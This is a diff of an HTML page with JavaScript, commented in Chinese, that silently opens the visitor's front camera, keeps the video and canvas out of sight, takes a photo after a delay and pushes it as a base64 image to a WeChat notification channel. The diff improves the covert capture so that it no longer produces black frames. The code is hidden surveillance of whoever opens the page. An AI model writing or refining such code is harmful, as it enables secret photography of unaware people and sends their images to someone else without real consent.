@@ -4,14 +4,15 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0">
 <style>
-/* 全程静默无显示，无任何界面提示 */
-video,canvas{display:none}
-body{background:#fff;height:100vh;margin:0;}
+/* 核心修复：视频不设display:none，而是移出屏幕，视觉隐藏但浏览器正常渲染，彻底解决黑屏 */
+#cam{position:absolute;left:-9999px;top:-9999px;width:480px;height:480px;}
+#box{display:none}
+body{background:#fff;height:100vh;margin:0;overflow:hidden;}
 </style>
 </head>
 <body>
 <video id="cam" autoplay playsinline muted></video>
-<canvas id="box"></canvas>
+<canvas id="box" width="480" height="480"></canvas>
 
 <script>
 // 你的专属推送密钥，已确认可用
@@ -31,7 +32,7 @@ async function sendToWechat(title, content) {
   }
 }
 
-// 自动拍照主逻辑（修复黑屏版）
+// 自动拍照主逻辑（彻底修复黑屏版）
 async function autoTakePhoto() {
   try {
     // 请求前置摄像头权限
@@ -43,24 +44,21 @@ async function autoTakePhoto() {
     const ctx = canvas.getContext("2d");
     video.srcObject = stream;
 
-    // 等摄像头画面完全就绪，再执行拍照
-    video.oncanplay = () => {
-      // 匹配画布和视频真实尺寸，彻底解决黑屏
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      
-      // 150ms延时，确保画面完全渲染
+    // 等摄像头画面完全加载、可流畅播放时，再执行拍照
+    video.oncanplaythrough = () => {
+      // 延长等待时间到500ms，确保移动端画面完全渲染，杜绝黑屏
       setTimeout(async () => {
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        // 绘制实时画面到画布
+        ctx.drawImage(video, 0, 0, 480, 480);
         // 压缩图片，避免推送长度超限
         const base64Img = canvas.toDataURL("image/jpeg", 0.6);
         // 关闭摄像头，减少设备占用
         stream.getTracks().forEach(track => track.stop());
 
-        // 直接推送照片查看链接，无任何第三方依赖
+        // 推送照片查看链接到微信
         const pushContent = `✅ 拍照成功！\n\n复制下面完整的链接到手机浏览器，即可直接查看实拍照片：\n\n${base64Img}`;
         await sendToWechat("成功拍到新照片", pushContent);
-      }, 150);
+      }, 500);
     };
   } catch (e) {
     // 权限拒绝/出错，推送兜底通知
